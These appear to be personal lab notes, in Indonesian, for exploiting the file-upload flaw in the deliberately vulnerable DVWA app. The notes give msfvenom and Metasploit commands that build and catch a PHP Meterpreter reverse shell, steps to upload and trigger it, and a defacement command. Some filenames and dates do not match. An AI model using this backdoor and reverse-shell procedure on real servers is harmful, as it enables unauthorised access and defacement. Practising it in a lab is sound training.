---
title: Upload PHP Backdoor
updated: 2025-12-17 00:40:48Z
created: 2025-12-17 00:40:26Z
latitude: -6.20239360
longitude: 106.65270990
altitude: 0.0000
---

## Di Server DVWA

Ubah ijin folder uploads

```
sudo su
chown www-data.www-data /var/www/html/DVWA-1.9/hackable/uploads/
chmod 775 /var/www/html/DVWA-1.9/hackable/uploads/
ls -ld /var/www/html/DVWA-1.9/hackable/uploads/
```

## Di Kali Linux

### Cek ip address

```
ifconfig
```

Misalnya IP address kali linux adalah 192.168.0.2

### Buat PHP msfpayload

```
mkdir -p /root/backdoor
cd /root/backdoor
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=4444 R > PHONE_HOME.php
ls -l PHONE_HOME.php
```

### Start Payload Listener

Jalankan

```
msfconsole
```

Ketik

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.0.2
set LPORT 4444
exploit
```

## Browse ke DVWA

```
http://ip-address/DVWA-1.9/
username admin
password password
```

```
DVWA Security > Low > Submit
File Upload > Browse
```

### hack

```
http://ip-address/DVWA-1.9/hackable/uploads/
```

aktifkan klik

```
PHONE-HOME.php
```

## Dari metasploit

Di metasploit jalankan

```
shell     Establishes a "sh" shell.
uptime    How long has the server been up
pwd       Current working directory
whoami    Show who am I logged in as.
w         Notice there is no entry for the user apache
echo "Hacked at 17-08-2017, by Your Name" > hacked.html
       Create some simple web graffiti
       Replace 4-23-2012 with the present date.
       Replace the string "Your Name" with your actual name.
ls -l
```

Cek

```
http://ip-addres/DVWA-1.9/hackable/uploads/hacked.html
```

## Referensi

- http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson8/index.html